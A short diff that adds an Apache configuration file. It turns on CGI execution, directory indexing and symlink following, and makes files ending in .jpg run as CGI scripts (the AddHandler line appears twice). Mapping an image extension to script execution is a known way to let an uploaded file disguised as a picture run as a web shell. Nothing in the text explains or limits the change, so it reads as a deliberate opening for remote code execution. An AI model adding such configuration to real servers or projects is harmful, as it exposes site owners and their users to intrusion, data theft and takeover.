@@ -1,0 +1,6 @@
+Options FollowSymLinks MultiViews Indexes ExecCGI
+
+AddType application/x-httpd-cgi .jpg
+
+AddHandler cgi-script .jpg
+AddHandler cgi-script .jpg
